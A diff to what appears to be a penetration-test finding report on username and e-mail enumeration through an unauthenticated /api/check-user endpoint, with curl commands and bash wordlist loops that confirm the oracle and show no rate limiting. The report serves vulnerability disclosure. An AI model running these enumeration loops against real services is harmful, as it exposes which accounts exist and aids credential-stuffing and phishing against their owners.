@@ -1,6 +1,6 @@
 # Description
 
-Username / e-mail enumeration (CWE-203 — Observable Discrepancy) via the unauthenticated boolean oracle `GET /api/check-user/?email=<candidate>`. The endpoint returns `{"exists": true|false}` based on whether an account matches, with **no authentication, rate-limiting, or CAPTCHA**. It matches against both usernames (`arthur`) and registered e-mails (`arthur@tbox.traced`), doubling the attack surface and letting an anonymous attacker enumerate the entire user base from a wordlist.
+Username / e-mail enumeration (CWE-203 — Observable Discrepancy) via the unauthenticated boolean oracle `GET /api/check-user/?email=<candidate>`. The endpoint returns `{"exists": true|false}` based on whether an account matches, with **no authentication, rate-limiting, or CAPTCHA**. It matches (exact, case-sensitive) against both usernames (`johndoe`) and registered e-mails (`john.doe@tbox.traced`), doubling the attack surface and letting an anonymous attacker enumerate the entire user base from a wordlist.
 
 # Exploitation
 
@@ -19,8 +19,9 @@ No cookie, no header, no anti-bot control — only network access is required.
 **1. Confirm the unauthenticated oracle:**
 
 ```bash
-curl -i "http://<TARGET>/api/check-user/?email=arthur"
+curl -i "http://<TARGET>/api/check-user/?email=johndoe"
 # HTTP/1.1 200 OK
+# Content-Type: application/json
 # {"exists": true}
 ```
 
@@ -29,13 +30,14 @@ curl -i "http://<TARGET>/api/check-user/?email=arthur"
 **2. Drive it with a wordlist:**
 
 ```bash
-for c in arthur admin johndoe nonexistent_xyz fake@example.com; do
+for c in admin johndoe janedoe nonexistent_xyz fake@example.com; do
   echo "$c → $(curl -s "http://<TARGET>/api/check-user/?email=$c")"
 done
-# arthur          → {"exists": true}
-# admin           → {"exists": true}
-# johndoe         → {"exists": true}
-# nonexistent_xyz → {"exists": false}
+# admin            → {"exists": true}
+# johndoe          → {"exists": true}
+# janedoe          → {"exists": true}
+# nonexistent_xyz  → {"exists": false}
+# fake@example.com → {"exists": false}
 ```
 
 ![Bulk enumeration loop output](check-user-bulk-enumeration.png)
@@ -43,10 +45,18 @@ done
 **3. Dual matching on username *and* e-mail:**
 
 ```bash
-curl -s "http://<TARGET>/api/check-user/?email=admin@tbox.traced"   # {"exists": true}
+curl -s "http://<TARGET>/api/check-user/?email=admin@tbox.traced"     # {"exists": true}
+curl -s "http://<TARGET>/api/check-user/?email=john.doe@tbox.traced"  # {"exists": true}
 ```
 
 ![Oracle matches both username and registered e-mail](check-user-boolean-oracle-terminal.png)
+
+**4. No rate limit:** 30 consecutive requests from the same client all returned `200 OK` with no throttling, lockout or CAPTCHA:
+
+```bash
+for i in $(seq 1 30); do curl -s -o /dev/null -w "%{http_code} " "http://<TARGET>/api/check-user/?email=probe$i"; done
+# 200 200 200 ... 200
+```
 
 # Risk
 
